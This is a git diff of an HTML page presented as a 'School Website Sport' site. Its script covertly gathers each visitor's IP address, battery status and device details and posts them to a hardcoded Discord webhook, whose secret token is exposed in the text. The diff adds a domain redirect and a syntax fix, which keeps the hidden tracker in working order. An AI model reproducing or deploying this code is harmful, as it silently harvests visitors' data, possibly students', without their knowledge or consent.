@@ -4,18 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>School Website Sport</title>
+        <script>
+        if (window.location.href === "https://xyz.github.io") {
+        window.location.href = "https://mycustomdomain.com";
+    }
+    </script>
 </head>
+
 <body>
     <h1></h1>
     <script>
         // Replace with your Discord webhook URL
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
-
- <script>
-    if (window.location.href === "https://xyz.github.io") {
-        window.location.href = "https://mycustomdomain.com";
-    }
-</script>
 
 
         
@@ -103,7 +103,7 @@
             .then(([ip, battery]) => {
                 const deviceInfo = getDeviceInfo();
                 sendToDiscord(ip, battery, deviceInfo);
-            })
+            });
   
 </script>
 </body>
